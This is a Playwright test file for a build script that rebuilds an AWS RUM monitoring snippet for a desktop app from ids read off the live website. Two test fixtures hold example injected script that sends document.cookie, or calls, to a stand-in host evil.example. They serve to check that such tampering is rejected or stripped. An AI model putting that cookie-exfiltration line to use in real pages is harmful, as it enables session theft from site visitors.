import { test, expect } from '@playwright/test'
import { readFileSync } from 'node:fs'
import path from 'node:path'
import { extractRumConfig, buildRumSnippet, injectRumSnippet, resolveRumSnippet } from '../scripts/rumSnippet.mjs'

// TI-98 — the desktop app ships the same frontend as the website, but only the website's
// deploy put the monitoring snippet into index.html, so every desktop fault reached nothing.
// The desktop build now reads the monitoring ids from the live site and rebuilds the snippet.

const PLACEHOLDER = '<script id="rum-snippet"></script>'
const CONFIG = {
  monitorId: '5a2b155e-05cd-40a7-9c9c-9b3e5e8c8564',
  region: 'eu-west-2',
  identityPoolId: 'eu-west-2:0b1c2d3e-4f50-6172-8394-a5b6c7d8e9f0',
}
const page = (head: string) => `<html><head><script>theme()</script>${head}</head><body></body></html>`
const livePage = page(buildRumSnippet(CONFIG))
const builtPage = page(PLACEHOLDER)
const okFetch = (body: string) => async () => new Response(body, { status: 200 })

test('reads the monitoring ids from the live page', () => {
  expect(extractRumConfig(livePage)).toEqual(CONFIG)
})

test('finds no ids when the live page carries only the empty placeholder', () => {
  expect(extractRumConfig(builtPage)).toBeNull()
})

test('finds no ids in a whitespace-only snippet', () => {
  expect(extractRumConfig(page('<script id="rum-snippet">\n</script>'))).toBeNull()
})

test('finds no ids in a snippet that is not the monitoring loader', () => {
  expect(extractRumConfig(page('<script id="rum-snippet">fetch("https://evil.example/"+document.cookie)</script>'))).toBeNull()
})

test('drops anything else the live snippet carries — only the template reaches the build', async () => {
  const tampered = buildRumSnippet(CONFIG).replace('</script>', ';fetch("https://evil.example/")</script>')
  const snippet = await resolveRumSnippet({ sourceUrl: 'x', required: true, fetchImpl: okFetch(page(tampered)) })
  expect(snippet).toBe(buildRumSnippet(CONFIG))
  expect(snippet).not.toContain('evil')
})

test('rejects ids whose regions disagree', () => {
  const mixed = buildRumSnippet(CONFIG).replace('identityPoolId:"eu-west-2:', 'identityPoolId:"us-east-1:')
  expect(extractRumConfig(page(mixed))).toBeNull()
})

test('replaces the empty placeholder in the built page with the snippet', () => {
  const snippet = buildRumSnippet(CONFIG)
  const out = injectRumSnippet(builtPage, snippet)
  expect(out).toContain(snippet)
  expect(out).not.toContain(PLACEHOLDER)
  expect(out).toContain('<script>theme()</script>')
})

test('refuses to inject when the built page has no placeholder', () => {
  expect(() => injectRumSnippet('<html></html>', 'x')).toThrow(/placeholder/)
})

test('a required snippet fails the build when the live site cannot be reached', async () => {
  const down = async () => { throw new Error('fetch failed') }
  await expect(resolveRumSnippet({ sourceUrl: 'x', required: true, fetchImpl: down })).rejects.toThrow(/fetch failed/)
})

test('a required snippet fails the build when the live page has no monitoring ids', async () => {
  await expect(resolveRumSnippet({ sourceUrl: 'x', required: true, fetchImpl: okFetch(builtPage) })).rejects.toThrow(/no monitoring ids/)
})

test('a required snippet fails the build on an error response', async () => {
  const notFound = async () => new Response('', { status: 503 })
  await expect(resolveRumSnippet({ sourceUrl: 'x', required: true, fetchImpl: notFound })).rejects.toThrow(/HTTP 503/)
})

test('an optional snippet warns and lets the build carry on', async () => {
  const warnings: string[] = []
  const down = async () => { throw new Error('fetch failed') }
  const snippet = await resolveRumSnippet({ sourceUrl: 'x', required: false, fetchImpl: down, warn: (m: string) => warnings.push(m) })
  expect(snippet).toBeNull()
  expect(warnings.join()).toMatch(/report no faults/)
})

test('the fetch is bounded by a timeout', async () => {
  let signal: AbortSignal | undefined
  const spy = async (_url: string, init?: RequestInit) => { signal = init?.signal ?? undefined; return new Response(livePage) }
  await resolveRumSnippet({ sourceUrl: 'x', required: true, fetchImpl: spy })
  expect(signal).toBeInstanceOf(AbortSignal)
})

test('the snippet matches the one the website deploy writes', () => {
  const wf = readFileSync(path.resolve(__dirname, '..', '..', '.github', 'workflows', 'deploy.yml'), 'utf8')
  for (const fragment of [
    'x=window.AwsRumClient={q:[],n:n,i:i,v:v,r:r,c:c,u:u};',
    '"https://client.rum.us-east-1.amazonaws.com/3.x/cwr.js",',
    'telemetries:["errors","performance",["http",{addXRayTraceIdHeader:true}]],',
    'allowCookies:true,enableXRay:true});</script>',
  ]) {
    expect(wf).toContain(fragment)
    expect(buildRumSnippet(CONFIG)).toContain(fragment)
  }
})

test('the source page still carries the placeholder the injection targets', () => {
  const source = readFileSync(path.resolve(__dirname, '..', '..', 'web', 'index.html'), 'utf8')
  expect(source).toContain(PLACEHOLDER)
})

test('the published installer build requires the snippet', () => {
  const wf = readFileSync(path.resolve(__dirname, '..', '..', '.github', 'workflows', 'publish-desktop.yml'), 'utf8')
  expect(wf).toMatch(/REQUIRE_RUM_SNIPPET:\s*["']?1/)
})
